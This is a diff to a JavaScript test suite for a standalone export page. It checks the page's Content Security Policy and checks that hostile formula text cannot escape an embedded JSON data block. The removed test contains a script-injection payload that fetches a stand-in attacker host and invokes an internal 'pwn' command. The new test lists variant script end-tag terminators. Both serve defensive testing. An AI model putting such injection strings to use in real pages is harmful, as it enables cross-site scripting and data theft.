@@ -51,28 +51,38 @@ describe('standalone export page CSP', () => {
     for (const source of scripts) expect(csp).toContain(inlineScriptHash(source));
     expect(csp).toContain('connect-src \'none\'');
     expect(csp).toContain('script-src-attr \'none\'');
+    expect(csp.match(/(?:^|; )img-src ([^;]+)/)?.[1]).toBe('data: blob: https:');
+    expect(csp.match(/(?:^|; )frame-src ([^;]+)/)?.[1]).toBe('\'self\' blob:');
     expect(csp).not.toContain('unsafe-eval');
     expect(scriptDirective).not.toContain('unsafe-inline');
     expect(html).not.toMatch(/new Function|\beval\s*\(/);
   });
 
-  it('escapes hostile reactive JSON so formula text cannot close its data block', () => {
-    const attack = '</script><script>fetch("https://attacker.invalid");window.__TAURI_INTERNALS__.invoke("pwn")</script>';
+  it('escapes every script-data end-tag terminator in formula sources and cell values', () => {
+    const terminators = ['</script >', '</script\t>', '</script/>', '</script\nfoo>', '</SCRIPT >', '</script bar=baz>'];
+    const attacks = terminators.map((terminator, index) => `${terminator}<img data-escape-probe="${index}">`);
+    const source = attacks.join('|');
     const html = toHtml(
       legacy(
         [
-          {id: 'bad', type: 'expr', data: {name: 'bad', source: attack}},
+          {id: 'bad', type: 'expr', data: {name: 'bad', source}},
           {id: 'shown', type: 'paragraph', data: {text: 'still inert'}},
         ],
-        [['bad', 42]],
+        [['bad', {attacks}]],
       ),
       'Hostile formula',
       '',
     );
-    const data = html.match(/<script type="application\/json" id="ob-data">([\s\S]*?)<\/script>/)?.[1];
+    const parsed = new DOMParser().parseFromString(html, 'text/html');
+    const data = parsed.querySelector<HTMLScriptElement>('#ob-data')?.textContent;
     expect(data).toBeTruthy();
-    expect(data).toContain('<\\/script><script>fetch');
-    expect(JSON.parse(data!).exprs[0].source).toBe(attack);
+    for (const terminator of terminators) {
+      const jsonTerminator = JSON.stringify(terminator).slice(1, -1).replace(/<\//g, '<\\/');
+      expect(data).toContain(jsonTerminator);
+    }
+    expect(JSON.parse(data!).exprs[0].source).toBe(source);
+    expect(JSON.parse(data!).values.bad).toEqual({attacks});
+    expect(parsed.querySelector('[data-escape-probe]')).toBeNull();
     // Only the hash-authorized runtime is executable; both copies of the raw
     // snapshot/expression are inside inert, closing-tag-escaped data scripts.
     expect(executableScripts(html)).toHaveLength(1);
